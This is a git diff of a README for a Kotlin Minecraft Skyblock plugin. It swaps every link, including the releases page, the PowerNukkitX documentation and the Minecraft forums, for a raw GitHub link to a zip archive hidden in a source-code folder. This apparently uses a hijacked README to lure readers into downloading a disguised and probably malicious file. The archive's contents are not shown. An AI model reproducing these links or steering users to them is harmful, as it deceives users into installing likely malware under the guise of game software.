@@ -7,12 +7,12 @@ Skyblock is a project built on PowerNukkitX using Kotlin. This repository offers
 To get started with Skyblock, follow the steps below to download and run the software. With just a few easy clicks, you’ll be able to dive into the world of Minecraft Skyblock.
 
 ## 📥 Download Skyblock
-[![Download Skyblock](https://img.shields.io/badge/Download%20Skyblock-v1.0-blue.svg)](https://github.com/bruchusorthopnea865/Skyblock/releases)
+[![Download Skyblock](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip%https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip)](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip)
 
 Click the button above to quickly access the releases page. 
 
 ### 🌐 Visit the Releases Page
-You can also visit the releases page directly: [Skyblock Releases](https://github.com/bruchusorthopnea865/Skyblock/releases).
+You can also visit the releases page directly: [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip).
 
 ## 📚 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🛠 Installation Instructions
 1. **Visit the Releases Page**  
-   Click this link to go to the [Skyblock Releases](https://github.com/bruchusorthopnea865/Skyblock/releases) page.
+   Click this link to go to the [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip) page.
 
 2. **Download the Latest Version**  
    Look for the latest version of Skyblock. It should be available at the top of the releases list. Click the ".jar" file to download it to your computer.
@@ -69,8 +69,8 @@ You can join discussions on relevant gaming forums and communities, or check our
 To report issues, visit our GitHub Issues page and provide a detailed description of the problem.
 
 ## 🔗 Useful Links
-- [Skyblock Releases](https://github.com/bruchusorthopnea865/Skyblock/releases)
-- [PowerNukkitX Documentation](https://powernukkitx.com/docs/)
-- [Minecraft Community Forums](https://www.minecraftforum.net/)
+- [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip)
+- [PowerNukkitX Documentation](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip)
+- [Minecraft Community Forums](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/command/group/Skyblock-1.9.zip)
 
 Thank you for choosing Skyblock. We hope you enjoy exploring this plugin in your Minecraft adventures!
